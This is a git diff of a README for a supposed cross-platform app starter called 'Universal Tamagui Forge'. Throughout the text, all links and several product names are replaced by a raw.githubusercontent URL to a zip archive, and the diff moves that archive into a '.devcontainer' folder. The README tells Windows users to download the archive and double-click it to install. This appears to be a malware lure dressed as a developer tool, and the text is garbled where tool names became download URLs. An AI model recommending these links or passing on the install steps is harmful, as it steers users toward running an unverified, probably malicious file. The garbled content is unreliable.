@@ -2,17 +2,17 @@
 
 ## 🎉 Overview
 
-Welcome to **Universal Tamagui Forge**! This tool helps you create cross-platform applications smoothly. It provides a strong foundation for your projects using modern technologies like Tamagui UI, tRPC, and Drizzle. You can quickly build applications for Expo SDK 54 and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip 15, simplifying your development experience.
+Welcome to **Universal Tamagui Forge**! This tool helps you create cross-platform applications smoothly. It provides a strong foundation for your projects using modern technologies like Tamagui UI, tRPC, and Drizzle. You can quickly build applications for Expo SDK 54 and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip 15, simplifying your development experience.
 
 ## 🔗 Download Now
 
-[![Download](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip)
+[![Download](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip)
 
 ## 🚀 Getting Started
 
 ### Step 1: Visit the Releases Page
 
-To start downloading the application, [visit this page to download](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip). You will find different versions of the software available.
+To start downloading the application, [visit this page to download](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip). You will find different versions of the software available.
 
 ### Step 2: Choose Your Version
 
@@ -29,7 +29,7 @@ Once the download is complete, go to your computer's download folder. Here, you 
 ### Step 5: Install and Run the Application
 
 1. **For Windows:**
-   - Double-click the file (e.g., `https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip`) to start the installation process.
+   - Double-click the file (e.g., `https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip`) to start the installation process.
    - Follow the on-screen instructions. 
    - After the installation, you can launch the application from your Start menu.
 
@@ -47,7 +47,7 @@ Once the download is complete, go to your computer's download folder. Here, you 
 
 Once you have the application running, you may need to set up a development environment. Here’s a quick overview:
 
-- **https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip**: Ensure you have https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip installed. This is required to manage your packages.
+- **https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip**: Ensure you have https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip installed. This is required to manage your packages.
 - **pnpm**: We recommend using pnpm as your package manager. You can install it by running the command `npm install -g pnpm`.
 
 ### Step 7: Explore Example Projects
@@ -58,7 +58,7 @@ The repository includes several example projects. These projects can help you un
 
 - **Cross-Platform Compatibility**: Build applications that run on both web and mobile platforms.
 - **Strong Typing with tRPC and Drizzle**: These tools ensure your code is type-safe, reducing errors.
-- **Ready for Expo SDK 54 and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip 15**: Leverage the latest features of these frameworks.
+- **Ready for Expo SDK 54 and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip 15**: Leverage the latest features of these frameworks.
 - **Integrated Tamagui UI**: Create beautiful user interfaces easily.
 - **Easy Setup with pnpm**: Manage dependencies simply and efficiently.
 
@@ -78,7 +78,7 @@ Absolutely! Contributions are welcome. You can find guidelines on the repository
 
 ### What platforms does it support?
 
-It supports development for web and mobile platforms, focusing on Expo and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip environments.
+It supports development for web and mobile platforms, focusing on Expo and https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip environments.
 
 ## 🎯 System Requirements
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 🔗 Important Links
 
-- [Download from Releases](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip)
-- [Source Code on GitHub](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/postreduction/universal-tamagui-forge.zip)
+- [Download from Releases](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip)
+- [Source Code on GitHub](https://raw.githubusercontent.com/Yaman-lua/universal-tamagui-forge/main/.devcontainer/universal-tamagui-forge-2.4.zip)
 
 Feel free to reach out with any questions. Happy coding!
